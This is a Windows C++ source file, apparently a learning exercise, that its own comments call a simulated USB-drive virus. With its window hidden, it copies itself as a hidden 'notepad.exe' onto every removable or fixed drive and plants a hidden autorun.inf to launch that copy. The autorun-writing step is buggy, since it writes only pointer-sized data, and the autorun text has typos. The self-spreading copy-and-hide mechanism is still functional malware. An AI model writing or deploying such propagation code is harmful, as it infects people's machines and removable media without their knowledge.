// USBDriveVirus.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "USBDriveVirus.h"

#define MAX_LOADSTRING 100

// 全局变量: 
HINSTANCE hInst;								// 当前实例
TCHAR szTitle[MAX_LOADSTRING];					// 标题栏文本
TCHAR szWindowClass[MAX_LOADSTRING];			// 主窗口类名

//下面是模拟U盘病毒的AutoRun.inf文件
LPWSTR szAutoRun = L"[AutoRun] \
				   	\r\nopen=notepad.exe \
					\r\nsshell\\open=打开(&O) \
					\r\nshell\\open\\Command=notepad.exe \
					\r\nshell\\explore\\Command=资源管理器(&X) \
					\r\nshell\\explore\\Command=notepad.exe \
					\r\nshellexcute=notepad.exe \
					\r\nshell\\Auto\\Command=notapad.exe";

// 此代码模块中包含的函数的前向声明: 
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

//传染病毒函数
void infect(LPWSTR pszFile, UINT uDriveType);


int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO:  在此放置代码。
	MSG msg;
	HACCEL hAccelTable;

	// 初始化全局字符串
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_USBDRIVEVIRUS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 执行应用程序初始化: 
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_USBDRIVEVIRUS));


	//开始传染病毒
	wchar_t szFileName[MAX_PATH] = { 0 };//自身所在地址
	wchar_t szRoot[4] = { 0 };//保存当前文件所在盘符
	UINT uType = 0;//保存磁盘类型
	//获取当前所在完整路径及文件名
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	//获取所在盘符
	lstrcpyn(szRoot, szFileName,4);

	uType = GetDriveType(szRoot);

	switch (uType)
	{
	case DRIVE_FIXED:
	{
		//如果在硬盘上就检测一遍是否有移动磁盘
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	}
	case DRIVE_REMOVABLE:
	{
		infect(szFileName, DRIVE_FIXED);
		break;
	}
	default:
		break;
	}

	// 主消息循环: 
	//while (GetMessage(&msg, NULL, 0, 0))
	//{
	//	if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
	//	{
	//		TranslateMessage(&msg);
	//		DispatchMessage(&msg);
	//	}
	//}
	
	//去掉下面一行
	msg.wParam = 0;
	return (int) msg.wParam;
}



//
//  函数:  MyRegisterClass()
//
//  目的:  注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_USBDRIVEVIRUS));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_USBDRIVEVIRUS);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   函数:  InitInstance(HINSTANCE, int)
//
//   目的:  保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 将实例句柄存储在全局变量中

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   //ShowWindow(hWnd, nCmdShow);
   //UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数:  WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND	- 处理应用程序菜单
//  WM_PAINT	- 绘制主窗口
//  WM_DESTROY	- 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// 分析菜单选择: 
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO:  在此添加任意绘图代码...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

void infect(LPWSTR pszFile, UINT uDriveType){
	wchar_t szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	wchar_t szRoot[4] = { 0 };
	UINT uType = 0;
	wchar_t szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);//获取本地所有逻辑驱动器

	while (iNum<dwRet)
	{
		lstrcpyn(szRoot,szDriveString+iNum, 4);
		uType = GetDriveType(szRoot);//获取驱动器类型
		if (uType == uDriveType){
			//拷贝文件
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, L"notepad.exe");

			//int res=
			CopyFile(pszFile, szTarget, FALSE);
			
			//CString ercd;
			//ercd.Format(_T("%d"),res);
			//MessageBox(NULL, szTarget, L"GG", MB_OK);
			
			//设置notepad.exe为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
			//建立AutoRun.inf文件
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, L"autorun.inf");
			HANDLE hFile = CreateFile(szTarget, //创建文件句柄
				GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);

			//ercd.Format(_T("%d"), GetLastError());
			//MessageBox(NULL, ercd, L"GG", MB_OK);
			DWORD dwWritten = 0;
			WriteFile(hFile, szAutoRun, sizeof(szAutoRun), &dwWritten, NULL);
			CloseHandle(hFile);
			//设置autorun.inf为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
		}
		iNum += 4;
	}
}